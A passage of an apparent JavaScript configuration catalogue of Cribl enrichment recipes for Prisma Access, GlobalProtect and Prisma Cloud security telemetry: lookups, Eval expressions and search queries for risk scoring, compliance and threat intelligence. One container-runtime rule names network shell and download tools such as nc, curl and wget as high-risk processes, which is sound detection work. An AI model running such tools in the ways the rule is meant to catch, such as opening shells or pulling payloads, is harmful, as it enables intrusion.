        observabilityValue: 'Supports application portfolio analysis — identifies which risk tiers consume the most bandwidth and which unsanctioned apps are trending.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'app_sanctioned = sanctioned_apps.includes(app_name) ? \'yes\' : \'no\'',
              'app_category_risk = [\'file-sharing\',\'proxy-avoidance\',\'p2p\'].includes(app_category) ? \'high\' : [\'social-media\',\'streaming\'].includes(app_category) ? \'medium\' : \'low\'',
              'app_risk_level = app_sanctioned==\'no\' && app_category_risk==\'high\' ? \'critical\' : app_sanctioned==\'no\' ? \'high\' : app_category_risk'
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// app_sanctioned = sanctioned_apps.includes(app_name) ? \'yes\' : \'no\'\n// app_category_risk = high-risk categories → \'high\', medium → \'medium\', else \'low\'\n// app_risk_level = combine sanction status + category risk\n//\n// BEFORE: { app_name: "wetransfer", app_category: "file-sharing" }\n// AFTER:  { ..., app_risk_level: "critical", app_sanctioned: "no", app_category_risk: "high" }',
          notes: 'Maintain sanctioned app list in a Cribl Global Variable or reference lookup. Review quarterly with IT governance. Prisma Access app-id field maps directly to app_name.'
        }
      },
      {
        name: 'Gateway Performance Scoring',
        description: 'Calculate session quality and bandwidth utilization metrics from Prisma Access session telemetry using Eval expressions.',
        criblFunction: 'Eval',
        addedFields: ['session_quality', 'bandwidth_utilization_pct'],
        securityValue: 'Degraded session quality can indicate man-in-the-middle attacks or tunnel manipulation. Sudden bandwidth spikes may signal data exfiltration.',
        observabilityValue: 'Enables real-time gateway health dashboards, identifies overloaded service connections, and supports capacity planning for Prisma Access nodes.',
        personas: ['NOC', 'SRE', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'bandwidth_utilization_pct = Math.round((bytes_sent + bytes_received) / allocated_bandwidth * 100)',
              'session_quality = latency_ms < 50 && packet_loss_pct < 1 ? \'excellent\' : latency_ms < 150 && packet_loss_pct < 3 ? \'good\' : latency_ms < 300 ? \'degraded\' : \'poor\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// bandwidth_utilization_pct = (bytes_sent + bytes_received) / allocated_bandwidth * 100\n// session_quality = based on latency_ms and packet_loss_pct thresholds\n//\n// BEFORE: { bytes_sent: 1048576, bytes_received: 5242880, allocated_bandwidth: 10485760, latency_ms: 45, packet_loss_pct: 0.2 }\n// AFTER:  { ..., session_quality: "excellent", bandwidth_utilization_pct: 60 }',
          notes: 'Thresholds should be tuned per deployment. SLA targets: excellent <50ms/<1% loss, good <150ms/<3% loss. Alert on sustained "poor" quality for VIP users.'
        }
      },
      {
        name: 'Threat Intelligence Lookup',
        description: 'Match source and destination IPs and domains against consolidated threat intelligence feeds to identify known malicious infrastructure.',
        criblFunction: 'Lookup',
        addedFields: ['threat_feed_match', 'threat_confidence', 'threat_actor'],
        securityValue: 'Pipeline-level IOC matching catches connections to known C2, botnets, and APT infrastructure before events reach SIEM. Enables real-time blocking recommendations.',
        observabilityValue: 'Provides threat volume metrics and feed effectiveness dashboards — which feeds produce the most actionable matches.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'threat_intel_ioc.csv',
            inputField: 'destination_ip → indicator',
            outputFields: ['threat_feed_match', 'threat_confidence', 'threat_actor'],
            reloadInterval: '15 minutes'
          },
          lookupSample: 'indicator,feed,confidence,actor\n198.51.100.99,Mandiant,95,APT29\n203.0.113.200,AlienVault,80,Lazarus Group\n192.0.2.50,Emerging-Threats,70,Emotet\n198.51.100.177,CrowdStrike,90,Fancy Bear',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: threat_intel_ioc.csv\n// Input: destination_ip → indicator (exact match)\n// Output: feed → threat_feed_match, confidence → threat_confidence, actor → threat_actor\n//\n// BEFORE: { destination_ip: "198.51.100.99", app_name: "web-browsing" }\n// AFTER:  { ..., threat_feed_match: "Mandiant", threat_confidence: 95, threat_actor: "APT29" }',
          notes: 'Aggregate feeds from MISP, commercial TI providers, and ISAC feeds into single CSV. Update every 15 minutes. High-confidence matches (>90) should trigger immediate CTA routing.'
        }
      }
    ],
    searchTime: [
      {
        name: 'User Activity Baseline',
        description: 'At investigation time, compare current user traffic against their historical daily baseline to identify anomalous data transfer volumes.',
        criblFunction: 'Search-time lookup',
        addedFields: ['baseline_bytes_daily', 'usage_anomaly_score'],
        securityValue: 'Identifies potential data exfiltration by flagging users transferring significantly more data than their historical norm. Critical for insider threat investigations.',
        observabilityValue: 'Supports capacity planning by identifying users whose usage patterns are changing, enabling proactive bandwidth allocation adjustments.',
        personas: ['SOC', 'Threat Hunting', 'SRE'],
        implementation: {
          example: '// Cribl Search user activity baseline analysis:\n// dataset="prisma_access_traffic" earliest=-1h\n// | summarize current_bytes=sum(bytes_out) by username\n// | lookup user_baselines.csv on username=user output avg_bytes_daily as baseline_bytes_daily\n// | extend usage_anomaly_score = round(current_bytes / baseline_bytes_daily * 100, 1)\n// | where usage_anomaly_score > 200\n// | order by usage_anomaly_score desc',
          notes: 'Baseline lookup table populated by scheduled job computing 30-day rolling average per user. Anomaly score >200 means 2x normal — investigate. >500 is critical.'
        }
      },
      {
        name: 'Application Usage Trending',
        description: 'At investigation time, rank application usage patterns and identify apps with significant growth or decline over recent periods.',
        criblFunction: 'Search-time lookup',
        addedFields: ['app_usage_rank', 'app_growth_pct'],
        securityValue: 'Rapidly growing unsanctioned app usage may indicate coordinated shadow IT adoption or social engineering campaigns driving users to malicious apps.',
        observabilityValue: 'Identifies trending applications for governance review, supports license optimization, and highlights apps needing bandwidth policy adjustments.',
        personas: ['SOC', 'SRE', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search application usage trending:\n// dataset="prisma_access_traffic" earliest=-7d\n// | summarize sessions_current=countif(timestamp > ago(1d)), sessions_prior=countif(timestamp <= ago(1d) and timestamp > ago(7d))/6 by app_name\n// | extend app_growth_pct = round((sessions_current - sessions_prior) / sessions_prior * 100, 1)\n// | extend app_usage_rank = row_rank(sessions_current)\n// | order by app_growth_pct desc\n// | where sessions_current > 10',
          notes: 'Compare last 24h to prior 6-day daily average. Filter out apps with <10 sessions to avoid noisy low-volume results. Growth >100% warrants review.'
        }
      }
    ]
  },
  'prisma-access-gp': {
    streamTime: [
      {
        name: 'GeoIP Enrichment',
        description: 'Add country, city, and ASN to the GlobalProtect client source_ip for geographic context on VPN connections.',
        criblFunction: 'GeoIP',
        addedFields: ['geo_country', 'geo_city', 'geo_asn'],
        securityValue: 'Detects impossible travel — user connecting from two distant countries within minutes. Identifies VPN connections from unexpected or high-risk regions.',
        observabilityValue: 'Maps remote workforce distribution geographically, identifies regions with connectivity issues, supports regional gateway capacity planning.',
        personas: ['SOC', 'NOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'GeoIP',
            inputField: 'source_ip',
            geoipDatabase: 'MaxMind GeoLite2-City + GeoLite2-ASN',
            outputPrefix: 'geo_'
          },
          example: '// Cribl Stream → Processing → GeoIP Function\n// Input Field: source_ip\n// Output Fields: geo_country, geo_city, geo_asn\n//\n// BEFORE: { source_ip: "86.42.178.12", username: "jsmith", portal: "gp-us-west" }\n// AFTER:  { ..., geo_country: "IE", geo_city: "Dublin", geo_asn: "AS5466" }',
          notes: 'For GlobalProtect, source_ip is the client public IP before tunnel establishment. This is the meaningful geo enrichment point — post-tunnel IPs are Prisma infrastructure.'
        }
      },
      {
        name: 'Device Compliance Lookup',
        description: 'Enrich device_host_id with compliance status from endpoint management — patch level, OS end-of-life status, and last patch date.',
        criblFunction: 'Lookup',
        addedFields: ['device_compliant', 'last_patch_date', 'os_eol_status'],
        securityValue: 'Identifies non-compliant devices connecting via GlobalProtect — unpatched or EOL devices represent elevated risk and may need restricted access policies.',
        observabilityValue: 'Tracks fleet compliance posture across remote workforce, identifies patch deployment gaps, and supports OS migration planning.',
        personas: ['SOC', 'SRE', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'device_compliance.csv',
            inputField: 'device_host_id → host_id',
            outputFields: ['device_compliant', 'last_patch_date', 'os_eol_status'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'host_id,compliant,last_patch,os_eol\nHID-001234,true,2026-06-05,supported\nHID-005678,false,2026-04-10,supported\nHID-009012,true,2026-06-01,supported\nHID-003456,false,2026-01-15,eol',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: device_compliance.csv\n// Input: device_host_id → host_id (exact match)\n// Output: compliant → device_compliant, last_patch → last_patch_date, os_eol → os_eol_status\n//\n// BEFORE: { device_host_id: "HID-005678", username: "jdoe", portal: "gp-us-east" }\n// AFTER:  { ..., device_compliant: "false", last_patch_date: "2026-04-10", os_eol_status: "supported" }',
          notes: 'Source from Intune/SCCM/Jamf compliance reports. Non-compliant + EOL devices should trigger CTAs for endpoint team. Update every 30 minutes to catch newly non-compliant devices.'
        }
      },
      {
        name: 'Gateway Health Scoring',
        description: 'Calculate connection quality and latency bucket from GlobalProtect session metrics using Eval expressions.',
        criblFunction: 'Eval',
        addedFields: ['connection_quality', 'latency_bucket'],
        securityValue: 'Sudden degradation in connection quality for specific users may indicate tunnel hijacking or network-level attacks on the VPN session.',
        observabilityValue: 'Enables real-time gateway health monitoring, identifies users experiencing poor connectivity, and supports SLA reporting for remote access.',
        personas: ['NOC', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'connection_quality = handshake_ms < 100 && retransmit_pct < 2 ? \'healthy\' : handshake_ms < 500 && retransmit_pct < 5 ? \'degraded\' : \'critical\'',
              'latency_bucket = latency_ms < 50 ? \'<50ms\' : latency_ms < 100 ? \'50-100ms\' : latency_ms < 200 ? \'100-200ms\' : \'>200ms\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// connection_quality = based on handshake_ms and retransmit_pct\n// latency_bucket = categorize latency_ms into ranges\n//\n// BEFORE: { handshake_ms: 85, retransmit_pct: 1.2, latency_ms: 67, gateway: "gp-us-west-1" }\n// AFTER:  { ..., connection_quality: "healthy", latency_bucket: "50-100ms" }',
          notes: 'Tune thresholds by region — users connecting from APAC to US gateways will naturally have higher latency. Consider per-gateway baselines.'
        }
      },
      {
        name: 'User Risk Lookup',
        description: 'Enrich username with composite risk score from identity governance platform — combining behavioral analytics, privilege level, and incident history.',
        criblFunction: 'Lookup',
        addedFields: ['user_risk_score', 'risk_factors', 'last_incident_date'],
        securityValue: 'High-risk users connecting from unusual locations or non-compliant devices get elevated alert priority. Enables risk-adaptive access controls at the data layer.',
        observabilityValue: 'Supports risk-based monitoring dashboards showing which high-risk users are currently connected and their session characteristics.',
        personas: ['SOC', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'user_risk_scores.csv',
            inputField: 'username → user',
            outputFields: ['user_risk_score', 'risk_factors', 'last_incident_date'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'user,risk_score,factors,last_incident\njsmith,25,none,never\njdoe,72,excessive_access+policy_violations,2026-05-20\nagarza,15,none,never\nmwilson,88,data_exfil_attempt+terminated_pending,2026-06-01',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: user_risk_scores.csv\n// Input: username → user (exact match)\n// Output: risk_score → user_risk_score, factors → risk_factors, last_incident → last_incident_date\n//\n// BEFORE: { username: "mwilson", source_ip: "198.51.100.5", portal: "gp-us-east" }\n// AFTER:  { ..., user_risk_score: 88, risk_factors: "data_exfil_attempt+terminated_pending", last_incident_date: "2026-06-01" }',
          notes: 'Source risk scores from UEBA platform (Exabeam, Securonix) or compute internally. Update hourly. Risk score >70 should trigger enhanced logging and SOC notification.'
        }
      },
      {
        name: 'Auth Method Strength Classification',
        description: 'Classify the authentication method used for GlobalProtect login by security strength and MFA presence.',
        criblFunction: 'Eval',
        addedFields: ['auth_strength', 'mfa_present'],
        securityValue: 'Identifies users authenticating with weak methods (password-only, expired certs). Enables policies that require step-up authentication for sensitive resource access.',
        observabilityValue: 'Tracks MFA adoption rates across the remote workforce and identifies authentication method distribution for security posture reporting.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'mfa_present = [\'push\', \'totp\', \'fido2\', \'smartcard\'].some(m => auth_method.toLowerCase().includes(m)) ? \'true\' : \'false\'',
              'auth_strength = auth_method.includes(\'fido2\') || auth_method.includes(\'smartcard\') ? \'strong\' : mfa_present==\'true\' ? \'standard\' : \'weak\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// mfa_present = check if auth_method contains known MFA types\n// auth_strength = classify as strong/standard/weak\n//\n// BEFORE: { auth_method: "SAML-push", username: "jsmith", portal: "gp-us-west" }\n// AFTER:  { ..., auth_strength: "standard", mfa_present: "true" }',
          notes: 'Auth method strings vary by IdP integration. Map your specific Prisma Access auth_method values to the classification logic. FIDO2/smartcard = strong, push/TOTP = standard, password-only = weak.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Connection Pattern Baseline',
        description: 'At investigation time, compare current connection behavior against the user historical baseline for session duration and typical gateway selection.',
        criblFunction: 'Search-time lookup',
        addedFields: ['avg_session_duration', 'typical_gateway'],
        securityValue: 'Detects credential compromise — stolen credentials used from unusual gateways or with abnormal session durations. Supports impossible travel validation.',
        observabilityValue: 'Identifies users experiencing connectivity issues (short sessions = disconnects) and gateway preference shifts indicating routing changes.',
        personas: ['SOC', 'Threat Hunting', 'SRE'],
        implementation: {
          example: '// Cribl Search connection pattern baseline:\n// dataset="prisma_access_gp" earliest=-24h\n// | summarize avg_duration=avg(session_duration_sec), current_gateway=any(gateway) by username\n// | lookup user_connection_baseline.csv on username=user output avg_session_duration, typical_gateway\n// | where current_gateway != typical_gateway or avg_duration < avg_session_duration * 0.3\n// | extend anomaly_reason = iif(current_gateway != typical_gateway, "unusual_gateway", "short_sessions")\n// | order by username',
          notes: 'Baseline computed from 30-day rolling window. Gateway changes are normal during travel — cross-reference with geo to validate. Sessions <30% of baseline duration suggest connectivity issues or rapid credential testing.'
        }
      },
      {
        name: 'Device History Query',
        description: 'At investigation time, retrieve device history — when it was first seen on the network and what other users have authenticated from it.',
        criblFunction: 'Search-time lookup',
        addedFields: ['device_first_seen', 'previous_users'],
        securityValue: 'New devices appearing with high-privilege accounts are high-risk. Multiple users on one device may indicate shared credentials or a compromised jump host.',
        observabilityValue: 'Tracks device lifecycle and sharing patterns. Useful for asset management and identifying unauthorized device pooling.',
        personas: ['SOC', 'Threat Hunting', 'Security Engineering'],
        implementation: {
          example: '// Cribl Search device history query:\n// dataset="prisma_access_gp" earliest=-90d\n// | where device_host_id == "$TARGET_DEVICE"\n// | summarize device_first_seen=min(timestamp), previous_users=makeset(username), session_count=count() by device_host_id\n// | extend user_count = array_length(previous_users)\n// | extend risk_indicator = iif(user_count > 3, "shared_device_risk", iif(user_count > 1, "multi_user", "single_user"))',
          notes: 'Devices with >3 unique users warrant investigation — may be a shared kiosk (acceptable) or compromised device (not acceptable). Cross-reference with asset inventory to determine device type.'
        }
      }
    ]
  },
  'prisma-cloud-cspm': {
    streamTime: [
      {
        name: 'Resource Criticality Lookup',
        description: 'Enrich cloud resource alerts with business criticality tier, ownership, and data classification based on resource type and naming conventions.',
        criblFunction: 'Lookup',
        addedFields: ['resource_tier', 'business_owner', 'data_classification'],
        securityValue: 'Prioritize misconfigurations on Tier-1 resources containing sensitive data. A public S3 bucket with PII is critical; one with marketing assets is not.',
        observabilityValue: 'Enables cost-of-risk dashboards by business unit and supports targeted remediation campaigns for high-value resource owners.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'resource_criticality.csv',
            inputField: 'resource_name → resource',
            outputFields: ['resource_tier', 'business_owner', 'data_classification'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'resource,tier,owner,classification\nprod-customer-db,tier-1,Data Engineering,PII\nprod-payment-api,tier-1,Commerce,PCI\nstaging-test-app,tier-3,QA Team,internal\ndev-ml-training,tier-2,Data Science,confidential',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: resource_criticality.csv\n// Input: resource_name → resource (exact or pattern match)\n// Output: tier → resource_tier, owner → business_owner, classification → data_classification\n//\n// BEFORE: { resource_name: "prod-customer-db", alert_type: "public_exposure", severity: "high" }\n// AFTER:  { ..., resource_tier: "tier-1", business_owner: "Data Engineering", data_classification: "PII" }',
          notes: 'Source from cloud tagging strategy (AWS tags, Azure resource tags, GCP labels). Fall back to naming conventions for untagged resources. Tier-1 = customer-facing + sensitive data.'
        }
      },
      {
        name: 'Compliance Gap Scoring',
        description: 'Calculate a composite compliance gap score based on the number and severity of compliance frameworks affected by each finding.',
        criblFunction: 'Eval',
        addedFields: ['compliance_gap_score', 'frameworks_affected_count'],
        securityValue: 'Prioritizes findings that violate multiple compliance frameworks simultaneously — a single misconfiguration affecting SOC2 + HIPAA + PCI is more urgent than one affecting only CIS.',
        observabilityValue: 'Enables compliance posture trending dashboards and audit preparation — shows which findings have the broadest regulatory impact.',
        personas: ['SOC', 'Compliance', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'frameworks_affected_count = compliance_frameworks ? compliance_frameworks.split(\',\').length : 0',
              'compliance_gap_score = frameworks_affected_count * (severity==\'critical\' ? 10 : severity==\'high\' ? 7 : severity==\'medium\' ? 4 : 1)'
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// frameworks_affected_count = count comma-separated frameworks\n// compliance_gap_score = frameworks * severity multiplier\n//\n// BEFORE: { compliance_frameworks: "SOC2,HIPAA,PCI-DSS", severity: "critical", resource_name: "prod-customer-db" }\n// AFTER:  { ..., compliance_gap_score: 30, frameworks_affected_count: 3 }',
          notes: 'Severity multipliers: critical=10, high=7, medium=4, low=1. Score >20 should auto-create CTAs for immediate remediation. Tune multipliers based on org regulatory priorities.'
        }
      },
      {
        name: 'Account Risk Lookup',
        description: 'Enrich the cloud account ID with risk profile, environment classification, and account ownership from the cloud governance registry.',
        criblFunction: 'Lookup',
        addedFields: ['account_risk_level', 'account_environment', 'account_owner'],
        securityValue: 'Production accounts with sensitive workloads get elevated alert priority. Findings in sandbox accounts can be deprioritized to reduce alert fatigue.',
        observabilityValue: 'Enables per-account and per-environment posture dashboards. Supports multi-account governance and identifies accounts needing additional guardrails.',
        personas: ['SOC', 'SRE', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'cloud_accounts.csv',
            inputField: 'account_id → account',
            outputFields: ['account_risk_level', 'account_environment', 'account_owner'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'account,risk_level,environment,owner\n123456789012,critical,production,Platform Engineering\n234567890123,high,staging,QA Team\n345678901234,low,sandbox,Developer Experience\n456789012345,critical,production,Data Engineering',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: cloud_accounts.csv\n// Input: account_id → account (exact match)\n// Output: risk_level → account_risk_level, environment → account_environment, owner → account_owner\n//\n// BEFORE: { account_id: "123456789012", alert_type: "security_group_open", resource_name: "prod-api-sg" }\n// AFTER:  { ..., account_risk_level: "critical", account_environment: "production", account_owner: "Platform Engineering" }',
          notes: 'Source from AWS Organizations, Azure Management Groups, or GCP Resource Manager. Critical accounts = production + PCI/HIPAA scope. Update hourly or on account lifecycle events.'
        }
      },
      {
        name: 'Alert Deduplication',
        description: 'Calculate a deduplication key and identify recurring alerts using Eval to reduce noise from known persistent misconfigurations.',
        criblFunction: 'Eval',
        addedFields: ['dedup_key', 'is_recurring', 'recurrence_count'],
        securityValue: 'Prevents alert fatigue by identifying recurring findings that have been previously triaged. Focuses SOC attention on new findings while tracking unresolved issues separately.',
        observabilityValue: 'Measures mean-time-to-remediate by tracking how long findings persist. Identifies chronically misconfigured resources that need architectural solutions.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'dedup_key = `${account_id}:${resource_name}:${policy_id}`',
              'is_recurring = C.Lookup(\'seen_alerts.csv\', dedup_key) ? \'true\' : \'false\'',
              'recurrence_count = C.Lookup(\'seen_alerts.csv\', dedup_key, \'count\') || 0'
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// dedup_key = composite key from account + resource + policy\n// is_recurring = check if this exact finding has been seen before\n// recurrence_count = how many times this finding has fired\n//\n// BEFORE: { account_id: "123456789012", resource_name: "prod-api-sg", policy_id: "BC_AWS_NETWORKING_31" }\n// AFTER:  { ..., dedup_key: "123456789012:prod-api-sg:BC_AWS_NETWORKING_31", is_recurring: "true", recurrence_count: 7 }',
          notes: 'Maintain seen_alerts.csv via scheduled job that aggregates historical findings. Recurring findings (count >3) should route to a separate queue for architectural review rather than immediate SOC triage.'
        }
      },
      {
        name: 'Remediation Priority Scoring',
        description: 'Calculate remediation priority combining resource risk, compliance impact, and exposure level to determine SLA and auto-remediation eligibility.',
        criblFunction: 'Eval',
        addedFields: ['remediation_priority', 'sla_hours', 'auto_remediate_eligible'],
        securityValue: 'Ensures critical exposed resources get immediate attention while lower-risk findings follow standard SLA. Enables automated remediation for well-understood, low-risk fixes.',
        observabilityValue: 'Supports SLA compliance dashboards and identifies remediation bottlenecks. Tracks auto-remediation coverage expansion over time.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'remediation_priority = severity==\'critical\' && is_public_exposure==\'true\' ? \'P1\' : severity==\'critical\' || (severity==\'high\' && resource_tier==\'tier-1\') ? \'P2\' : severity==\'high\' ? \'P3\' : \'P4\'',
              'sla_hours = remediation_priority==\'P1\' ? 4 : remediation_priority==\'P2\' ? 24 : remediation_priority==\'P3\' ? 72 : 168',
              'auto_remediate_eligible = [\'security_group_open\', \'public_bucket\', \'encryption_disabled\'].includes(alert_type) && account_environment!=\'production\' ? \'true\' : \'false\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// remediation_priority = P1-P4 based on severity + exposure + tier\n// sla_hours = mapped from priority\n// auto_remediate_eligible = safe auto-fix patterns in non-prod\n//\n// BEFORE: { severity: "critical", is_public_exposure: "true", resource_tier: "tier-1", alert_type: "public_bucket", account_environment: "staging" }\n// AFTER:  { ..., remediation_priority: "P1", sla_hours: 4, auto_remediate_eligible: "true" }',
          notes: 'P1 = actively exposed + critical, P2 = critical or high+tier-1, P3 = high, P4 = medium/low. Auto-remediation restricted to non-production and well-understood fix patterns to avoid production impact.'
        }
      }
    ],
    searchTime: [
      {
        name: 'Resource Change History',
        description: 'At investigation time, query configuration change history for a resource to identify when it drifted from compliant state.',
        criblFunction: 'Search-time lookup',
        addedFields: ['config_changes_30d', 'last_compliant_date'],
        securityValue: 'Identifies when a resource was last compliant and what change caused the drift. Critical for incident investigation — determines if misconfiguration was intentional or accidental.',
        observabilityValue: 'Tracks configuration change velocity — resources with frequent changes may need architectural review or additional change controls.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          example: '// Cribl Search resource change history:\n// dataset="prisma_cloud_cspm" earliest=-30d\n// | where resource_name == "$TARGET_RESOURCE"\n// | summarize config_changes_30d=count(), last_compliant_date=maxif(timestamp, compliance_status=="pass") by resource_name, account_id\n// | extend days_since_compliant = datetime_diff(\'day\', now(), last_compliant_date)\n// | extend drift_severity = iif(days_since_compliant > 14, "chronic", iif(days_since_compliant > 3, "persistent", "recent"))',
          notes: 'Resources non-compliant for >14 days are chronic — likely need architectural fix. Recent drift (<3 days) is likely a change that can be reverted. Cross-reference with CloudTrail for who made the change.'
        }
      },
      {
        name: 'Account Posture Trending',
        description: 'At investigation time, analyze overall account security posture trajectory — trending better or worse over recent periods.',
        criblFunction: 'Search-time lookup',
        addedFields: ['posture_score_trend', 'open_alerts_count'],
        securityValue: 'Identifies accounts with deteriorating security posture before they become breach vectors. Negative trends warrant proactive intervention even if individual alerts are low severity.',
        observabilityValue: 'Supports executive reporting on cloud security posture improvement. Identifies accounts needing additional investment or guardrails.',
        personas: ['SOC', 'SRE', 'Compliance'],
        implementation: {
          example: '// Cribl Search account posture trending:\n// dataset="prisma_cloud_cspm" earliest=-30d\n// | summarize open_alerts_count=countif(status=="open"), resolved_count=countif(status=="resolved") by account_id, bin(timestamp, 1d) as day\n// | extend daily_posture = round(resolved_count / (open_alerts_count + resolved_count) * 100, 1)\n// | summarize posture_scores=makelist(daily_posture) by account_id\n// | extend posture_score_trend = iif(posture_scores[-1] > posture_scores[0], "improving", iif(posture_scores[-1] < posture_scores[0], "degrading", "stable"))\n// | order by open_alerts_count desc',
          notes: 'Posture score = resolved / (open + resolved) as percentage. Trending computed by comparing first week to last week of the 30-day window. Degrading accounts should trigger executive-level review.'
        }
      }
    ]
  },
  'prisma-cloud-cwp': {
    streamTime: [
      {
        name: 'Image Vulnerability Lookup',
        description: 'Enrich container runtime events with vulnerability summary for the running image — total CVE count, critical CVEs, and composite risk score.',
        criblFunction: 'Lookup',
        addedFields: ['image_vuln_count', 'critical_cves', 'image_risk_score'],
        securityValue: 'Identifies runtime alerts from highly vulnerable images — an alert from an image with 15 critical CVEs warrants faster response than one from a clean image.',
        observabilityValue: 'Tracks vulnerable image deployment across clusters, supports vulnerability SLA compliance monitoring, and identifies images needing urgent patching.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'image_vulnerabilities.csv',
            inputField: 'image_id → image',
            outputFields: ['image_vuln_count', 'critical_cves', 'image_risk_score'],
            reloadInterval: '30 minutes'
          },
          lookupSample: 'image,vuln_count,critical,risk_score\nsha256:abc123,47,3,92\nsha256:def456,12,0,35\nsha256:ghi789,89,8,99\nsha256:jkl012,5,0,15',
          example: '// Cribl Stream → Processing → Lookup Function\n// Lookup File: image_vulnerabilities.csv\n// Input: image_id → image (exact match on digest)\n// Output: vuln_count → image_vuln_count, critical → critical_cves, risk_score → image_risk_score\n//\n// BEFORE: { image_id: "sha256:abc123", container_name: "payment-api", alert_type: "process_anomaly" }\n// AFTER:  { ..., image_vuln_count: 47, critical_cves: 3, image_risk_score: 92 }',
          notes: 'Source from Prisma Cloud image scan results via API. Update every 30 minutes. Risk score combines CVE count, severity, exploitability (EPSS), and fix availability.'
        }
      },
      {
        name: 'Container Workload Lookup',
        description: 'Enrich container events with workload ownership context — team, business tier, and environment classification based on namespace and cluster.',
        criblFunction: 'Lookup',
        addedFields: ['workload_owner', 'workload_tier', 'workload_environment'],
        securityValue: 'Prioritizes alerts from tier-1 production workloads over development namespaces. Identifies responsible team for immediate escalation during incidents.',
        observabilityValue: 'Enables per-team and per-tier workload health dashboards. Supports chargeback models and capacity planning by business unit.',
        personas: ['SOC', 'SRE', 'Security Engineering'],
        implementation: {
          functionConfig: {
            function: 'Lookup',
            lookupFile: 'workload_registry.csv',
            inputField: 'namespace + cluster → workload_key',
            outputFields: ['workload_owner', 'workload_tier', 'workload_environment'],
            reloadInterval: '1 hour'
          },
          lookupSample: 'workload_key,owner,tier,environment\nprod-us-east:payments,Commerce Team,tier-1,production\nprod-us-east:auth,Identity Team,tier-1,production\nstaging-us:ml-training,Data Science,tier-3,staging\ndev-cluster:sandbox,Developer Experience,tier-4,development',
          example: '// Cribl Stream → Processing → Eval + Lookup\n// Pre-process: workload_key = `${cluster}:${namespace}`\n// Lookup File: workload_registry.csv\n// Input: workload_key (exact match)\n// Output: owner → workload_owner, tier → workload_tier, environment → workload_environment\n//\n// BEFORE: { cluster: "prod-us-east", namespace: "payments", container_name: "payment-api-7f8d9" }\n// AFTER:  { ..., workload_owner: "Commerce Team", workload_tier: "tier-1", workload_environment: "production" }',
          notes: 'Build workload_key as cluster:namespace composite. Source from Kubernetes namespace annotations or internal service registry. Tier-1 production alerts get P1 SLA.'
        }
      },
      {
        name: 'Process Reputation Classification',
        description: 'Classify runtime processes by expected/unexpected status and risk level based on container baseline profiles.',
        criblFunction: 'Eval',
        addedFields: ['process_expected', 'process_risk_level', 'baseline_deviation'],
        securityValue: 'Identifies unexpected processes in containers — a crypto miner or reverse shell in a web server container is immediately flagged as high-risk baseline deviation.',
        observabilityValue: 'Tracks baseline drift across deployments. High deviation rates after deployments indicate misconfigured containers or missing process allowlists.',
        personas: ['SOC', 'Security Engineering', 'SRE'],
        implementation: {
          functionConfig: {
            function: 'Eval',
            expressions: [
              'process_expected = C.Lookup(\'container_baselines.csv\', `${image_name}:${process_name}`) ? \'true\' : \'false\'',
              'process_risk_level = process_expected==\'false\' && [\'nc\', \'ncat\', \'curl\', \'wget\', \'python\', \'perl\', \'bash\'].includes(process_name) ? \'high\' : process_expected==\'false\' ? \'medium\' : \'low\'',
              'baseline_deviation = process_expected==\'false\' ? \'unexpected_process\' : \'within_baseline\''
            ]
          },
          example: '// Cribl Stream → Processing → Eval Function\n// process_expected = check process against image baseline\n// process_risk_level = high for known attack tools, medium for unknown, low for expected\n// baseline_deviation = flag whether this deviates from baseline\n//\n// BEFORE: { image_name: "nginx", process_name: "nc", container_id: "abc123" }\n// AFTER:  { ..., process_expected: "false", process_risk_level: "high", baseline_deviation: "unexpected_process" }',
          notes: 'Baseline CSV built from Prisma Cloud learned runtime models. Update after each deployment cycle. Interactive shells (bash, sh) in non-debug containers are always high-risk.'
        }
      },
      {
        name: 'MITRE Technique Mapping',
        description: 'Map Prisma Cloud CWP attack types to MITRE ATT&CK framework techniques, tactics, and descriptions for standardized threat classification.',
        criblFunction: 'Lookup',
        addedFields: ['mitre_technique_id', 'mitre_tactic', 'mitre_description'],
